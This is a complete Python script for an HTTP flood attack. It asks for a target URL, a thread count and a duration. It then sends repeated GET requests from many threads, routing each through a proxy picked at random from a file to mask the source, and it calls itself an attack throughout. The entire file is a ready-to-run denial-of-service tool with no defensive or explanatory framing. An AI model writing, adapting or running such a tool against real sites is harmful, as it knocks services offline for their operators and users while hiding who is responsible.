import requests
import threading
import time
import random

# Load proxy list
with open("proxy.txt") as f:
    proxies = [line.strip() for line in f if line.strip()]

# User Inputs
target_url = input("🔗 Enter target URL (with https://): ").strip()
thread_count = int(input("🔁 Enter number of threads (e.g. 50): "))
attack_duration = int(input("⏱️ Enter attack duration (in seconds): "))

# Attack function
def flood():
    end_time = time.time() + attack_duration
    while time.time() < end_time:
        proxy = random.choice(proxies)
        proxy_dict = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
        try:
            response = requests.get(target_url, proxies=proxy_dict, timeout=5)
            print(f"[✓] Sent via {proxy} | Status: {response.status_code}")
        except Exception as e:
            print(f"[x] Failed with {proxy} | Error: {e}")

# Confirm Start
input("✅ Press ENTER to launch the attack...")

# Launch threads
for _ in range(thread_count):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

time.sleep(attack_duration + 1)
print("🛑 Attack finished.")
